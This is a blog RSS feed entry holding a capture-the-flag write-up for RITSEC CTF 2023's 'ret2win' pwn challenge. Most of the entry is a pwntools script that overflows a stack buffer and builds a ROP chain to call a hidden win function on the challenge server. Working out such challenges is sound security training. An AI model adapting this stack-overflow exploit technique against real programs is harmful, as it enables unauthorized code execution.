<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss">
  <channel>
    <title>pwn on CT</title>
    <link>http://treseco.github.io/tags/pwn/</link>
    <description>Recent content in pwn on CT</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Tue, 23 May 2023 19:01:07 -0400</lastBuildDate><atom:link href="http://treseco.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" /><icon>http://treseco.github.io/logo.svg</icon>
    
    
    <item>
      <title>ret2win</title>
      <link>http://treseco.github.io/posts/ritsecctf23/ret2win/</link>
      <pubDate>Tue, 23 May 2023 19:01:07 -0400</pubDate>
      
      <guid>http://treseco.github.io/posts/ritsecctf23/ret2win/</guid>
      <description><![CDATA[<h3 id="ret2win">ret2win</h3>
<ul>
<li>Pwn</li>
<li>83 pts</li>
</ul>
<hr>
<h4 id="description">Description</h4>
<blockquote>
<p>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.</p>
</blockquote>
<hr>
<h4 id="files">Files</h4>
<p><code>ret2win</code> - ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped</p>
<hr>
<h4 id="solve">Solve</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./ret2win&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal<span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>, <span style="color:#e6db74">&#39;splitw&#39;</span>, <span style="color:#e6db74">&#39;-v&#39;</span>]
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args[<span style="color:#e6db74">&#39;REMOTE&#39;</span>]:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ret2win.challenges.ctf.ritsec.club&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#p = gdb.debug(&#39;./ret2win&#39;, &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#    starti</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#&#39;&#39;&#39;)</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
</span></span><span style="display:flex;"><span>win <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>supersecrettoplevelfunction
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(ROP)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)  <span style="color:#75715e">#does not work on remote, buffer not flushed?</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#ae81ff">40</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4012b3</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xcafebabe</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x4012b1</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xc0debabe</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0xffffffff</span>)<span style="color:#f92672">+</span>p64(win))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
  </channel>
</rss>
